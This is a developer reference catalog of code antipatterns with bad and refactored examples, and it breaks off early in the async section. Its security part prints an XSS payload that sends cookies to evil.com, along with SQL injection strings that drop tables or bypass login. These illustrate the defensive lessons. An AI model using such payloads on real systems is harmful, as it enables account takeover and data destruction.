# Code Antipatterns Catalog

A reference guide for code reviewers and developers. Each antipattern is accompanied by the problem it causes, a concrete bad example, and a corrected version.

---

## Table of Contents

1. [Structural Issues](#1-structural-issues)
   - [God Class](#11-god-class)
   - [Long Method](#12-long-method)
   - [Deeply Nested Code (Arrow Antipattern)](#13-deeply-nested-code-arrow-antipattern)
   - [Primitive Obsession](#14-primitive-obsession)
   - [Shotgun Surgery](#15-shotgun-surgery)
2. [Logic Problems](#2-logic-problems)
   - [Boolean Blindness](#21-boolean-blindness)
   - [Stringly-Typed Code](#22-stringly-typed-code)
   - [Magic Numbers and Magic Strings](#23-magic-numbers-and-magic-strings)
   - [Null / Undefined Cascade](#24-null--undefined-cascade)
   - [Flag Arguments](#25-flag-arguments)
3. [Security Vulnerabilities](#3-security-vulnerabilities)
   - [SQL Injection](#31-sql-injection)
   - [Hardcoded Credentials](#32-hardcoded-credentials)
   - [Trusting User Input (XSS)](#33-trusting-user-input-xss)
   - [Insecure Direct Object Reference (IDOR)](#34-insecure-direct-object-reference-idor)
   - [Overly Broad Error Exposure](#35-overly-broad-error-exposure)
4. [Performance Antipatterns](#4-performance-antipatterns)
   - [N+1 Query Problem](#41-n1-query-problem)
   - [Synchronous I/O in Hot Paths](#42-synchronous-io-in-hot-paths)
   - [Unbounded Result Sets](#43-unbounded-result-sets)
   - [Repeated Expensive Computation](#44-repeated-expensive-computation)
5. [Testing Antipatterns](#5-testing-antipatterns)
   - [Excessive Mocking](#51-excessive-mocking)
   - [Testing Implementation Details](#52-testing-implementation-details)
   - [Flaky Tests (Time and Randomness Dependencies)](#53-flaky-tests-time-and-randomness-dependencies)
   - [Test Logic Duplication (Copy-Paste Tests)](#54-test-logic-duplication-copy-paste-tests)
6. [Async / Await Pitfalls](#6-async--await-pitfalls)
   - [Unhandled Promise Rejections](#61-unhandled-promise-rejections)
   - [Sequential Awaits for Independent Operations](#62-sequential-awaits-for-independent-operations)
   - [Async Void Functions](#63-async-void-functions)
   - [Missing Await (Silent Data Loss)](#64-missing-await-silent-data-loss)

---

## 1. Structural Issues

### 1.1 God Class

**Description:** A single class that knows too much and does too much — it accumulates responsibilities that should belong to separate, focused modules.

**Why it's problematic:**
- Hard to understand: you must read thousands of lines to grasp a single feature.
- High coupling: everything depends on one class, so any change risks breaking unrelated functionality.
- Impossible to unit-test in isolation.
- Merge conflicts are constant because every developer touches the same file.

**Bad example (TypeScript):**
```typescript
// One class responsible for users, billing, emails, and analytics
class Application {
  db: Database;

  // User management
  createUser(email: string, password: string) { /* ... */ }
  deleteUser(userId: string) { /* ... */ }
  resetPassword(userId: string) { /* ... */ }

  // Billing
  chargeCard(userId: string, amount: number) { /* ... */ }
  issueRefund(invoiceId: string) { /* ... */ }
  generateInvoice(userId: string) { /* ... */ }

  // Email
  sendWelcomeEmail(userId: string) { /* ... */ }
  sendPasswordResetEmail(email: string, token: string) { /* ... */ }
  sendInvoiceEmail(invoiceId: string) { /* ... */ }

  // Analytics
  trackEvent(eventName: string, properties: object) { /* ... */ }
  generateReport(startDate: Date, endDate: Date) { /* ... */ }
}
```

**Refactored example:**
```typescript
class UserService {
  constructor(private db: Database, private emailService: EmailService) {}

  async createUser(email: string, password: string): Promise<User> { /* ... */ }
  async deleteUser(userId: string): Promise<void> { /* ... */ }
  async resetPassword(userId: string): Promise<void> { /* ... */ }
}

class BillingService {
  constructor(private db: Database, private paymentGateway: PaymentGateway) {}

  async chargeCard(userId: string, amount: number): Promise<Receipt> { /* ... */ }
  async issueRefund(invoiceId: string): Promise<void> { /* ... */ }
  async generateInvoice(userId: string): Promise<Invoice> { /* ... */ }
}

class EmailService {
  constructor(private mailer: Mailer) {}

  async sendWelcomeEmail(userId: string): Promise<void> { /* ... */ }
  async sendPasswordResetEmail(email: string, token: string): Promise<void> { /* ... */ }
  async sendInvoiceEmail(invoiceId: string): Promise<void> { /* ... */ }
}

class AnalyticsService {
  constructor(private tracker: EventTracker) {}

  trackEvent(eventName: string, properties: object): void { /* ... */ }
  generateReport(startDate: Date, endDate: Date): Promise<Report> { /* ... */ }
}
```

**Rule of thumb:** If you need to scroll more than a few screens to see what a class does, it is probably a God Class. Each class should have a single, clearly stateable responsibility.

---

### 1.2 Long Method

**Description:** A function or method that has grown to handle multiple conceptual steps — often hundreds of lines — making it impossible to reason about at a glance.

**Why it's problematic:**
- Cognitive overload: you must hold the entire method in your head to understand any one part.
- Difficult to test: a 200-line method typically has 20+ execution paths.
- Reuse is impossible: individual steps are buried inside the body.

**Bad example (Python):**
```python
def process_order(order_id: str) -> dict:
    # Fetch order
    order = db.query(f"SELECT * FROM orders WHERE id = '{order_id}'")
    if not order:
        return {"error": "Order not found"}

    # Validate inventory
    items = db.query(f"SELECT * FROM order_items WHERE order_id = '{order_id}'")
    for item in items:
        stock = db.query(f"SELECT stock FROM products WHERE id = '{item['product_id']}'")
        if stock[0]['stock'] < item['quantity']:
            return {"error": f"Insufficient stock for product {item['product_id']}"}

    # Calculate totals
    subtotal = 0
    for item in items:
        product = db.query(f"SELECT price FROM products WHERE id = '{item['product_id']}'")
        subtotal += product[0]['price'] * item['quantity']
    tax = subtotal * 0.08
    shipping = 9.99 if subtotal < 50 else 0
    total = subtotal + tax + shipping

    # Charge the customer
    payment_result = payment_gateway.charge(order['user_id'], total)
    if not payment_result['success']:
        return {"error": "Payment failed"}

    # Update inventory
    for item in items:
        db.execute(
            f"UPDATE products SET stock = stock - {item['quantity']} WHERE id = '{item['product_id']}'"
        )

    # Send confirmation email
    user = db.query(f"SELECT email FROM users WHERE id = '{order['user_id']}'")
    email_service.send(user[0]['email'], "Order Confirmed", f"Your order {order_id} has been placed.")

    db.execute(f"UPDATE orders SET status = 'confirmed' WHERE id = '{order_id}'")
    return {"success": True, "total": total}
```

**Refactored example:**
```python
def process_order(order_id: str) -> dict:
    order = fetch_order_or_raise(order_id)
    items = fetch_order_items(order_id)

    validate_inventory(items)
    total = calculate_order_total(items)
    charge_customer(order, total)

    decrement_inventory(items)
    send_order_confirmation(order)
    mark_order_confirmed(order_id)

    return {"success": True, "total": total}


def fetch_order_or_raise(order_id: str) -> dict:
    order = db.get_order(order_id)
    if not order:
        raise OrderNotFoundError(order_id)
    return order


def validate_inventory(items: list[dict]) -> None:
    for item in items:
        stock = db.get_product_stock(item["product_id"])
        if stock < item["quantity"]:
            raise InsufficientStockError(item["product_id"])


def calculate_order_total(items: list[dict]) -> Decimal:
    subtotal = sum(
        db.get_product_price(item["product_id"]) * item["quantity"]
        for item in items
    )
    tax = subtotal * Decimal("0.08")
    shipping = Decimal("0") if subtotal >= 50 else Decimal("9.99")
    return subtotal + tax + shipping


def charge_customer(order: dict, total: Decimal) -> None:
    result = payment_gateway.charge(order["user_id"], total)
    if not result.success:
        raise PaymentFailedError(order["id"])
```

**Rule of thumb:** If a method cannot be understood in 10–15 seconds, extract named helper functions. Each function should do one thing and do it completely.

---

### 1.3 Deeply Nested Code (Arrow Antipattern)

**Description:** Control flow with multiple nested levels of `if`, `for`, or `try` blocks — so named because the code shape resembles an arrow pointing right.

**Why it's problematic:**
- Harder to follow the "happy path" — readers must track multiple open scopes simultaneously.
- Errors and edge cases blur together with main logic.
- Adding another condition requires touching indentation everywhere.

**Bad example (TypeScript):**
```typescript
async function processUpload(file: File | null, userId: string | null) {
  if (file) {
    if (userId) {
      if (file.size < MAX_SIZE) {
        if (ALLOWED_TYPES.includes(file.type)) {
          try {
            const user = await db.findUser(userId);
            if (user) {
              if (user.storageUsed + file.size < user.storageLimit) {
                const url = await storage.upload(file);
                await db.saveFile(userId, url, file.size);
                return { success: true, url };
              } else {
                return { error: "Storage limit exceeded" };
              }
            } else {
              return { error: "User not found" };
            }
          } catch (e) {
            return { error: "Upload failed" };
          }
        } else {
          return { error: "File type not allowed" };
        }
      } else {
        return { error: "File too large" };
      }
    } else {
      return { error: "User ID required" };
    }
  } else {
    return { error: "No file provided" };
  }
}
```

**Refactored example (guard clauses + early return):**
```typescript
async function processUpload(file: File | null, userId: string | null) {
  if (!file)   return { error: "No file provided" };
  if (!userId) return { error: "User ID required" };

  if (file.size >= MAX_SIZE)                   return { error: "File too large" };
  if (!ALLOWED_TYPES.includes(file.type))      return { error: "File type not allowed" };

  const user = await db.findUser(userId);
  if (!user) return { error: "User not found" };

  if (user.storageUsed + file.size >= user.storageLimit) {
    return { error: "Storage limit exceeded" };
  }

  try {
    const url = await storage.upload(file);
    await db.saveFile(userId, url, file.size);
    return { success: true, url };
  } catch {
    return { error: "Upload failed" };
  }
}
```

**Rule of thumb:** If your code is more than 3 levels deep, reach for guard clauses (early returns) or extract nested blocks into named functions.

---

### 1.4 Primitive Obsession

**Description:** Representing domain concepts using raw primitives (`string`, `number`, `boolean`) instead of dedicated types or value objects.

**Why it's problematic:**
- Primitive values carry no semantic meaning — a `string` for an email looks identical to a `string` for a username.
- Validation must be repeated everywhere the value is used.
- Functions with multiple `string` or `number` parameters invite argument-order bugs.

**Bad example (TypeScript):**
```typescript
function createUser(
  email: string,
  password: string,
  age: number,
  role: string
): void {
  // Is email validated? Is age >= 0? What are the valid roles?
  // We have no idea at the call site.
  db.insert({ email, password, age, role });
}

// Easy to accidentally swap arguments
createUser("admin", "alice@example.com", 25, "hunter2");
//          ^^^^^^^ oops — email and role are swapped
```

**Refactored example:**
```typescript
type Email  = string & { readonly __brand: "Email" };
type Role   = "admin" | "editor" | "viewer";

interface NewUser {
  email:    Email;
  password: string;
  age:      number;
  role:     Role;
}

function parseEmail(raw: string): Email {
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(raw)) {
    throw new TypeError(`Invalid email: ${raw}`);
  }
  return raw as Email;
}

async function createUser(user: NewUser): Promise<void> {
  // Validation is centralized; the type system enforces it at call sites.
  await db.insert(user);
}

// TypeScript will catch argument-order mistakes at compile time
await createUser({
  email:    parseEmail("alice@example.com"),
  password: "hunter2",
  age:      25,
  role:     "admin",
});
```

---

### 1.5 Shotgun Surgery

**Description:** A single conceptual change requires editing many unrelated files or modules.

**Why it's problematic:**
- High risk of forgetting one of the scattered edit sites.
- Merge conflicts multiply.
- Indicates missing abstraction — related logic is not co-located.

**Symptom:** Adding a new payment provider requires editing `routes.ts`, `billing.ts`, `webhook.ts`, `admin.ts`, and `email-templates/invoice.html` individually.

**Fix:** Introduce an abstraction (interface + registry) that centralises the variation point. New payment providers implement the interface; all call sites use it uniformly.

```typescript
// Before: every file does its own provider switch
// After: a single registry owns the variation
interface PaymentProvider {
  charge(amount: number, token: string): Promise<Receipt>;
  refund(receiptId: string): Promise<void>;
}

const providers: Record<string, PaymentProvider> = {
  stripe: new StripeProvider(),
  paypal: new PayPalProvider(),
};

// One place to extend; zero other files change
export function getProvider(name: string): PaymentProvider {
  const provider = providers[name];
  if (!provider) throw new Error(`Unknown payment provider: ${name}`);
  return provider;
}
```

---

## 2. Logic Problems

### 2.1 Boolean Blindness

**Description:** A function returns `true`/`false` (or accepts a boolean parameter) when the actual meaning of each value is not self-evident at the call site.

**Why it's problematic:**
- `processOrder(true)` tells the reader nothing. They must open the function definition to understand the argument.
- `if (result)` hides *what* succeeded — success? existence? validity?
- Refactoring a boolean into an enum later is painful.

**Bad example:**
```typescript
// What does `true` mean here? Async? Admin mode? Create if missing?
function getUser(id: string, true): User { /* ... */ }
const user = getUser("abc", true);

// Is this checking success? Existence? Being truthy by accident?
if (sendEmail(payload)) {
  markComplete();
}
```

**Refactored example:**
```typescript
type FetchMode = "create-if-missing" | "read-only";

function getUser(id: string, mode: FetchMode): User { /* ... */ }
const user = getUser("abc", "create-if-missing"); // crystal clear

// Return a typed result rather than a raw boolean
type EmailResult =
  | { status: "sent"; messageId: string }
  | { status: "failed"; reason: string };

const result = await sendEmail(payload);
if (result.status === "sent") {
  markComplete();
}
```

---

### 2.2 Stringly-Typed Code

**Description:** Using arbitrary strings where a finite set of values, an enum, or a structured type should be used.

**Why it's problematic:**
- Typos silently produce wrong behavior at runtime (`"compelted"` vs `"completed"`).
- No IDE autocomplete or compiler safety.
- Refactoring (e.g., renaming a state) requires grep-and-pray across the codebase.

**Bad example (TypeScript):**
```typescript
function updateOrderStatus(orderId: string, status: string) {
  if (status === "compelted") {  // silent typo — never matches
    notifyShipping(orderId);
  }
}

updateOrderStatus("123", "dispatched"); // not a documented status — who knows what happens
```

**Refactored example:**
```typescript
type OrderStatus = "pending" | "processing" | "dispatched" | "completed" | "cancelled";

function updateOrderStatus(orderId: string, status: OrderStatus): void {
  if (status === "completed") {  // compiler catches typos before runtime
    notifyShipping(orderId);
  }
}

// Python equivalent using an Enum
from enum import Enum

class OrderStatus(Enum):
    PENDING    = "pending"
    PROCESSING = "processing"
    DISPATCHED = "dispatched"
    COMPLETED  = "completed"
    CANCELLED  = "cancelled"

def update_order_status(order_id: str, status: OrderStatus) -> None:
    if status == OrderStatus.COMPLETED:
        notify_shipping(order_id)
```

---

### 2.3 Magic Numbers and Magic Strings

**Description:** Numeric or string literals appear in logic with no explanation of what they represent.

**Why it's problematic:**
- `if (retries > 3)` — what is 3? Why 3? Should it be configurable?
- The same literal scattered across files creates silent inconsistency when one site is updated.

**Bad example:**
```python
def calculate_price(base_price: float) -> float:
    if base_price > 1000:
        return base_price * 0.85   # ??? 
    return base_price * 1.08       # ???

time.sleep(30)  # Why 30?
```

**Refactored example:**
```python
BULK_DISCOUNT_THRESHOLD = Decimal("1000.00")
BULK_DISCOUNT_RATE      = Decimal("0.85")   # 15% off
TAX_RATE                = Decimal("0.08")   # 8% sales tax
RETRY_BACKOFF_SECONDS   = 30

def calculate_price(base_price: Decimal) -> Decimal:
    if base_price > BULK_DISCOUNT_THRESHOLD:
        return base_price * BULK_DISCOUNT_RATE
    return base_price * (1 + TAX_RATE)

time.sleep(RETRY_BACKOFF_SECONDS)
```

---

### 2.4 Null / Undefined Cascade

**Description:** Code that reaches many levels deep through potentially-null values without ever guarding against `null`, relying on optional chaining but never actually handling the absent case.

**Why it's problematic:**
- `Cannot read property 'name' of undefined` errors in production.
- Missing data silently propagates as `undefined`, corrupting downstream logic.

**Bad example (TypeScript):**
```typescript
// If any link in this chain is null/undefined, the whole expression
// silently becomes undefined — and we just display nothing, no error
const city = user?.address?.city?.name;
renderBillingLabel(city); // city could be undefined, and renderBillingLabel silently shows nothing
```

**Refactored example:**
```typescript
function getBillingCity(user: User): string {
  const city = user?.address?.city?.name;
  if (!city) {
    // Explicit fallback — not silent
    throw new MissingDataError(`User ${user.id} has no billing city`);
    // or: return "Unknown City";
  }
  return city;
}
```

**Rule of thumb:** Optional chaining (`?.`) is for reads; always pair it with a guard or fallback that makes the absent case explicit.

---

### 2.5 Flag Arguments

**Description:** A boolean (or enum) argument that causes a function to behave in two fundamentally different ways.

**Why it's problematic:**
- A function that does two different things violates the single-responsibility principle.
- Call sites are confusing: `render(component, true)` — what does `true` activate?

**Bad example:**
```typescript
function render(component: Component, isPreview: boolean) {
  if (isPreview) {
    // completely different logic: no analytics, watermark, read-only
    return renderPreview(component);
  }
  // production path
  trackAnalytics(component.id);
  return renderProduction(component);
}

render(myComponent, true);  // reader must look up the signature
```

**Refactored example:**
```typescript
function renderPreview(component: Component): HTML {
  return buildPreviewHtml(component);
}

function renderProduction(component: Component): HTML {
  trackAnalytics(component.id);
  return buildProductionHtml(component);
}

renderPreview(myComponent);   // self-documenting
```

---

## 3. Security Vulnerabilities

### 3.1 SQL Injection

**Description:** User-supplied input is concatenated directly into a SQL query string.

**Why it's problematic:**
- An attacker can terminate your query and append arbitrary SQL: `'; DROP TABLE users; --`
- Data exfiltration, authentication bypass, and full database compromise are all possible.
- This is consistently in the OWASP Top 10. The consequences can be catastrophic.

**Bad example (Python):**
```python
def get_user(username: str):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)

# Attacker input: ' OR '1'='1
# Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'
# Returns ALL users — authentication bypassed
```

**Refactored example — always use parameterised queries:**
```python
def get_user(username: str):
    # The DB driver escapes the parameter — user input never touches SQL syntax
    return db.execute(
        "SELECT * FROM users WHERE username = %s",
        (username,)
    )

# TypeScript with a query builder (e.g., Prisma, Drizzle)
const user = await prisma.user.findUnique({
  where: { username },   // Prisma parameterises automatically — no raw strings
});

# If you must write raw SQL, use tagged parameters
const user = await db.query(
  "SELECT * FROM users WHERE username = $1",
  [username]   // driver handles escaping
);
```

**Additional defences:** Principle of least privilege on DB users; ORM or query builder by default; WAF as a supplementary layer.

---

### 3.2 Hardcoded Credentials

**Description:** Passwords, API keys, tokens, or connection strings are embedded directly in source code.

**Why it's problematic:**
- Every developer, CI system, and anyone who ever clones the repo has access to the secret.
- Secrets committed to git are effectively permanent — git history is rarely scrubbed.
- Secrets are environment-specific; hardcoding them breaks deployments across environments.

**Bad example:**
```typescript
const stripe = new Stripe("sk_live_51AbCdEf...RealSecretKey");

const db = new Pool({
  host:     "prod-db.company.internal",
  password: "SuperSecretP@ssw0rd!",
});
```

**Refactored example:**
```typescript
// Load from environment variables — never commit .env files with real values
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);

const db = new Pool({
  host:     process.env.DB_HOST,
  password: process.env.DB_PASSWORD,
});
```

```bash
# .env.example committed to git (no real values)
STRIPE_SECRET_KEY=sk_live_YOUR_KEY_HERE
DB_HOST=localhost
DB_PASSWORD=YOUR_PASSWORD_HERE

# .env added to .gitignore — never committed
```

**Additional measures:** Secret scanning in CI (GitHub Advanced Security, GitGuardian); secret rotation on suspected exposure; use a secrets manager (AWS Secrets Manager, HashiCorp Vault) for production.

---

### 3.3 Trusting User Input (XSS)

**Description:** User-provided text is rendered as raw HTML without sanitisation, allowing script injection.

**Why it's problematic:**
- An attacker submits `<script>fetch('https://evil.com?c='+document.cookie)</script>` as their display name.
- Every user who sees that name now sends their session cookie to the attacker.
- Account takeover without any server-side breach.

**Bad example (TypeScript/React):**
```typescript
// dangerouslySetInnerHTML executes any HTML the server returns
function Comment({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// Express — writing raw user input to the response
app.get("/greet", (req, res) => {
  res.send(`<h1>Hello, ${req.query.name}</h1>`);
  //                     ^^^^^^^^^^^^^^^ raw HTML injection
});
```

**Refactored example:**
```typescript
// React auto-escapes text content — use this by default
function Comment({ content }: { content: string }) {
  return <div>{content}</div>;
}

// If rich text IS required, sanitise with a trusted library
import DOMPurify from "dompurify";

function RichComment({ html }: { html: string }) {
  const safe = DOMPurify.sanitize(html, { ALLOWED_TAGS: ["b", "i", "em", "strong"] });
  return <div dangerouslySetInnerHTML={{ __html: safe }} />;
}

// Express — escape output
import escapeHtml from "escape-html";
app.get("/greet", (req, res) => {
  res.send(`<h1>Hello, ${escapeHtml(String(req.query.name))}</h1>`);
});
```

---

### 3.4 Insecure Direct Object Reference (IDOR)

**Description:** An endpoint accepts a resource ID from the user and fetches the resource without verifying the requesting user actually owns it.

**Why it's problematic:**
- Changing `?invoiceId=1001` to `?invoiceId=1002` exposes another user's invoice.
- Authentication (are you logged in?) is not the same as authorisation (are you allowed to see *this*?).

**Bad example:**
```typescript
app.get("/invoice/:id", authenticate, async (req, res) => {
  // Fetches the invoice for whoever owns ID — no ownership check
  const invoice = await db.getInvoice(req.params.id);
  res.json(invoice);
});
```

**Refactored example:**
```typescript
app.get("/invoice/:id", authenticate, async (req, res) => {
  const invoice = await db.getInvoice(req.params.id);

  if (!invoice || invoice.userId !== req.user.id) {
    // Return 404, not 403 — don't confirm the resource exists
    return res.status(404).json({ error: "Invoice not found" });
  }

  res.json(invoice);
});
```

**Rule of thumb:** Every data-access endpoint must check `resource.ownerId === currentUser.id` (or equivalent role/permission check). Authentication middleware alone is not enough.

---

### 3.5 Overly Broad Error Exposure

**Description:** Raw stack traces, database errors, or internal state are returned in API responses.

**Why it's problematic:**
- Stack traces reveal file paths, library versions, and logic the attacker can probe.
- Database errors can disclose schema information useful for SQL injection refinement.
- Provides a free reconnaissance tool to attackers.

**Bad example:**
```typescript
app.get("/user/:id", async (req, res) => {
  try {
    const user = await db.findUser(req.params.id);
    res.json(user);
  } catch (err) {
    // Sends full stack trace and SQL error to the client
    res.status(500).json({ error: err.message, stack: err.stack });
  }
});
```

**Refactored example:**
```typescript
import { logger } from "./logger";

app.get("/user/:id", async (req, res) => {
  try {
    const user = await db.findUser(req.params.id);
    res.json(user);
  } catch (err) {
    // Log internally with full detail
    logger.error("Failed to fetch user", { userId: req.params.id, err });
    // Return a generic, safe message to the client
    res.status(500).json({ error: "An unexpected error occurred" });
  }
});
```

---

## 4. Performance Antipatterns

### 4.1 N+1 Query Problem

**Description:** Fetching a list of N records and then issuing an additional database query *per record* to load related data — resulting in N+1 total queries instead of 1 or 2.

**Why it's problematic:**
- 100 posts → 101 queries instead of 2.
- Database connection overhead and round-trip latency multiply linearly with data size.
- Under load, this becomes the primary bottleneck.

**Bad example (Python / SQLAlchemy-style):**
```python
def get_posts_with_authors():
    posts = db.query("SELECT * FROM posts")        # Query 1

    for post in posts:
        # One extra query PER POST — N queries for N posts
        author = db.query(
            "SELECT * FROM users WHERE id = %s", (post["author_id"],)
        )
        post["author"] = author[0]

    return posts
# Result: 1 + N queries
```

**Refactored example — JOIN or eager load:**
```python
def get_posts_with_authors():
    # Single query: database does the join
    return db.query("""
        SELECT posts.*, users.name AS author_name, users.email AS author_email
        FROM posts
        JOIN users ON users.id = posts.author_id
    """)
# Result: 1 query

# TypeScript (Prisma) — use include for eager loading
const posts = await prisma.post.findMany({
  include: { author: true },  // Prisma emits a single JOIN, not N selects
});
```

**When joins aren't available:** Batch-load with `WHERE id IN (...)`:
```python
author_ids = [post["author_id"] for post in posts]
authors = db.query(
    "SELECT * FROM users WHERE id IN %s", (tuple(author_ids),)
)
author_map = {a["id"]: a for a in authors}

for post in posts:
    post["author"] = author_map[post["author_id"]]
# Result: 2 queries total regardless of N
```

---

### 4.2 Synchronous I/O in Hot Paths

**Description:** Blocking (synchronous) file reads, network calls, or CPU-intensive operations executed on the main thread / event loop in a path that handles many concurrent requests.

**Why it's problematic:**
- Node.js and Python asyncio have a single event loop. Blocking it stalls *all* concurrent requests.
- 1 slow synchronous call can cause a latency spike visible to every active user.

**Bad example (Node.js):**
```typescript
import fs from "fs";

app.get("/config", (req, res) => {
  // Blocks the event loop for every single request
  const config = fs.readFileSync("./config.json", "utf-8");
  res.json(JSON.parse(config));
});
```

**Refactored example:**
```typescript
import fs from "fs/promises";

// Option 1: Cache at startup — only one read ever
let config: Config;
async function loadConfig() {
  config = JSON.parse(await fs.readFile("./config.json", "utf-8"));
}
await loadConfig();

app.get("/config", (_req, res) => {
  res.json(config);   // pure in-memory — no I/O in the hot path
});

// Option 2: Async if you must read per-request
app.get("/config", async (req, res) => {
  const raw = await fs.readFile("./config.json", "utf-8");  // non-blocking
  res.json(JSON.parse(raw));
});
```

---

### 4.3 Unbounded Result Sets

**Description:** Querying a table without a `LIMIT` clause, or returning entire collections to callers who only need a page of results.

**Why it's problematic:**
- A table with 10M rows returned in full will exhaust memory and time out.
- Even "small" tables grow over time; what works in development fails in production.

**Bad example:**
```python
def get_all_orders() -> list:
    return db.query("SELECT * FROM orders")  # could be millions of rows
```

**Refactored example:**
```python
DEFAULT_PAGE_SIZE = 50
MAX_PAGE_SIZE = 500

def get_orders(page: int = 1, page_size: int = DEFAULT_PAGE_SIZE) -> dict:
    page_size = min(page_size, MAX_PAGE_SIZE)
    offset = (page - 1) * page_size

    rows = db.query(
        "SELECT * FROM orders ORDER BY created_at DESC LIMIT %s OFFSET %s",
        (page_size, offset)
    )
    total = db.query_scalar("SELECT COUNT(*) FROM orders")

    return {
        "data": rows,
        "page": page,
        "page_size": page_size,
        "total": total,
    }
```

---

### 4.4 Repeated Expensive Computation

**Description:** A computation that is expensive (CPU, I/O, or time) is re-run on every call even when the result has not changed.

**Why it's problematic:**
- Waste of compute resources.
- Introduces unnecessary latency on every request.

**Bad example (TypeScript):**
```typescript
app.get("/pricing", async (_req, res) => {
  // Fetches all products and recomputes tiers on every single request
  const products = await db.getAllProducts();
  const tiers = computePricingTiers(products);  // expensive
  res.json(tiers);
});
```

**Refactored example — simple in-process cache with TTL:**
```typescript
let cachedTiers: PricingTier[] | null = null;
let cacheExpiresAt: number = 0;
const CACHE_TTL_MS = 5 * 60 * 1000; // 5 minutes

async function getPricingTiers(): Promise<PricingTier[]> {
  if (cachedTiers && Date.now() < cacheExpiresAt) {
    return cachedTiers;
  }
  const products = await db.getAllProducts();
  cachedTiers = computePricingTiers(products);
  cacheExpiresAt = Date.now() + CACHE_TTL_MS;
  return cachedTiers;
}

app.get("/pricing", async (_req, res) => {
  res.json(await getPricingTiers());
});
```

For distributed systems, replace the in-process cache with Redis or a shared cache layer so multiple server instances share the cached value.

---

## 5. Testing Antipatterns

### 5.1 Excessive Mocking

**Description:** A test mocks so many dependencies that it is effectively testing the mocking framework rather than any real logic. No actual code paths are exercised.

**Why it's problematic:**
- The test passes even when the real integration is completely broken.
- Every internal refactor breaks the test even if behaviour is unchanged.
- False confidence: green tests, broken production.

**Bad example (TypeScript / Jest):**
```typescript
it("should save and return a user", async () => {
  // Every dependency mocked — nothing real runs
  const mockDb = { insert: jest.fn().mockResolvedValue({ id: "1" }) };
  const mockEmail = { send: jest.fn().mockResolvedValue(undefined) };
  const mockLogger = { info: jest.fn() };

  const service = new UserService(mockDb, mockEmail, mockLogger);
  const result = await service.createUser("alice@example.com", "secret");

  // We're only verifying that the mocks were called, not that any real
  // code works correctly
  expect(mockDb.insert).toHaveBeenCalledWith(
    expect.objectContaining({ email: "alice@example.com" })
  );
  expect(result.id).toBe("1");
});
```

**Refactored example — use a real (in-memory) implementation:**
```typescript
it("should save and return a user", async () => {
  // Use real implementations backed by an in-memory or test database
  const db = new InMemoryDatabase();
  const email = new FakeEmailService();
  const service = new UserService(db, email);

  const user = await service.createUser("alice@example.com", "secret");

  // Assert on actual observable behaviour
  expect(user.email).toBe("alice@example.com");
  expect(await db.findUser(user.id)).toBeDefined();
  expect(email.sent).toHaveLength(1);
  expect(email.sent[0].to).toBe("alice@example.com");
});
```

**Guideline:** Mock across process boundaries (third-party APIs, external services). Use real or in-memory implementations for everything within the process.

---

### 5.2 Testing Implementation Details

**Description:** Tests assert on internal state, private method calls, or internal data structures rather than observable behaviour.

**Why it's problematic:**
- Any internal refactor (rename a private method, change an internal variable) breaks the tests — even if external behaviour is unchanged.
- Tests become an obstacle to improvement rather than a safety net.

**Bad example:**
```typescript
it("should call _buildPayload before sending", async () => {
  const spy = jest.spyOn(service as any, "_buildPayload");
  await service.sendNotification(user, message);
  expect(spy).toHaveBeenCalled();  // Testing implementation, not behaviour
});
```

**Refactored example:**
```typescript
it("should deliver a notification to the user", async () => {
  await service.sendNotification(user, "Hello!");

  // Assert on observable outcome: did the notification arrive?
  const notifications = await notificationStore.getForUser(user.id);
  expect(notifications).toContainEqual(
    expect.objectContaining({ message: "Hello!" })
  );
});
```

---

### 5.3 Flaky Tests (Time and Randomness Dependencies)

**Description:** Tests depend on the real system clock (`Date.now()`, `new Date()`) or on `Math.random()`, producing different results on different runs.

**Why it's problematic:**
- Tests fail intermittently in CI with no code change.
- Flaky tests erode trust in the entire test suite — teams start ignoring red.

**Bad example:**
```typescript
it("should expire tokens after 1 hour", async () => {
  const token = await createToken(user);
  // Relies on actual time passing — slow and non-deterministic in CI
  await sleep(3_600_000);
  expect(await validateToken(token)).toBe(false);
});

it("should assign a random ID", () => {
  const user = createUser("alice");
  expect(user.id).toHaveLength(8); // passes most of the time, fails on edge cases
});
```

**Refactored example — inject time and randomness:**
```typescript
// The service accepts a clock dependency
class TokenService {
  constructor(
    private db: Database,
    private clock: () => number = Date.now  // default to real clock
  ) {}

  async isExpired(token: Token): Promise<boolean> {
    return this.clock() > token.expiresAt;
  }
}

// Test with a deterministic fake clock
it("should mark a token as expired after 1 hour", async () => {
  let now = 1_000_000;
  const service = new TokenService(db, () => now);

  const token = await service.createToken(user);

  now += 3_600_001; // advance fake clock past expiry
  expect(await service.isExpired(token)).toBe(true);
});
```

---

### 5.4 Test Logic Duplication (Copy-Paste Tests)

**Description:** The same test structure is copied tens of times with only minor variations, leading to maintenance nightmares when shared setup or assertions need to change.

**Why it's problematic:**
- Fixing a bug in the assertion requires updating every copy.
- Hard to see the actual variation; tests become walls of noise.

**Bad example:**
```typescript
it("accepts 'admin' role", () => {
  expect(isValidRole("admin")).toBe(true);
});
it("accepts 'editor' role", () => {
  expect(isValidRole("editor")).toBe(true);
});
it("accepts 'viewer' role", () => {
  expect(isValidRole("viewer")).toBe(true);
});
it("rejects 'superuser' role", () => {
  expect(isValidRole("superuser")).toBe(false);
});
// ... 20 more identical blocks
```

**Refactored example — parameterised / table-driven tests:**
```typescript
const cases: [string, boolean][] = [
  ["admin",     true],
  ["editor",    true],
  ["viewer",    true],
  ["superuser", false],
  ["",          false],
  ["ADMIN",     false],  // case-sensitive?
];

it.each(cases)("isValidRole(%s) → %s", (role, expected) => {
  expect(isValidRole(role)).toBe(expected);
});

// Python equivalent (pytest.mark.parametrize)
@pytest.mark.parametrize("role, expected", [
    ("admin",     True),
    ("editor",    True),
    ("viewer",    True),
    ("superuser", False),
])
def test_is_valid_role(role: str, expected: bool) -> None:
    assert is_valid_role(role) == expected
```

---

## 6. Async / Await Pitfalls

### 6.1 Unhandled Promise Rejections

**Description:** A promise is created or a `.then()` chain is started, but no `.catch()` / `try-catch` handles potential rejections. If the promise rejects, the error is silently swallowed (or, in newer Node.js versions, crashes the process).

**Why it's problematic:**
- Silent failures: operations appear to succeed but nothing happened.
- In older Node.js, unhandled rejections produce `UnhandledPromiseRejectionWarning` and may be suppressed.
